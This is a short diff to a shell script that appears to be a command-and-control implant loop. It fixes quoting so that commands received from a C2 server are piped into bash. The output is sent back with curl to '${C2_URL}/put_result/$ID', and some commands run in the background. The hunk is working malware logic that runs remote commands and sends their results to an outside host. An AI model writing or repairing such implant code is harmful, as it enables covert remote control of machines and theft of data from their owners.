@@ -11,9 +11,9 @@ do
     CMD=$(echo $CMD | cut -d, -f 3-)
     if [ ! "$FG" = "false" ]
     then
-      echo $CMD | bash | curl -s -d @- "${C2_URL}/put_result/$ID"
+      echo "$CMD" | bash | curl -s -d @- "${C2_URL}/put_result/$ID"
     else
-      echo #CMD | bash &
+      echo "$CMD" | bash &
     fi
   else
     sleep 5
